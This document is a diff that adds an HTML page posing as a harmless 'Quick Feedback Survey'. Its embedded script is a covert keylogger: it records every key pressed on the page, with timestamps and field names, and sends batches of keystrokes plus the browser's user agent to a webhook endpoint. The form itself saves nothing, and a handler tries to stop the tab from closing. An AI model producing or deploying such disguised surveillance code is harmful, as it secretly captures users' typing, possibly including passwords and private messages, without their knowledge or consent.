@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick Survey</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Quick Feedback Survey</h2>
+        <p>Hey, we’re gathering quick opinions! Take 30 seconds to answer and help us out.</p>
+        <form id="surveyForm">
+            <input type="text" id="name" placeholder="Your Name (optional)">
+            <textarea id="feedback" placeholder="What’s one thing you’d improve about online content?" rows="4"></textarea>
+            <button type="submit">Submit</button>
+        </form>
+        <p id="thanks" style="display: none; color: green;">Thanks for your feedback!</p>
+    </div>
+
+    <script>
+        let keystrokes = [];
+        const webhookUrl = 'https://your-webhook-url.com/log'; // Replace with your endpoint
+
+        // Capture all keystrokes
+        document.addEventListener('keydown', (e) => {
+            const timestamp = new Date().toISOString();
+            const key = e.key || 'Unknown';
+            const inputField = document.activeElement.id || 'UnknownField';
+            keystrokes.push({ time: timestamp, key: key, field: inputField });
+            
+            // Send data periodically (every 10 keystrokes)
+            if (keystrokes.length >= 10) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device: navigator.userAgent,
+                        keystrokes: keystrokes
+                    })
+                }).catch(err => console.error('Failed to send data'));
+                keystrokes = [];
+            }
+        });
+
+        // On form submit, show thanks message
+        document.getElementById('surveyForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            document.getElementById('thanks').style.display = 'block';
+            document.getElementById('surveyForm').reset();
+        });
+
+        // Keep tab open by preventing accidental close (optional)
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+    </script>
+</body>
+</html>
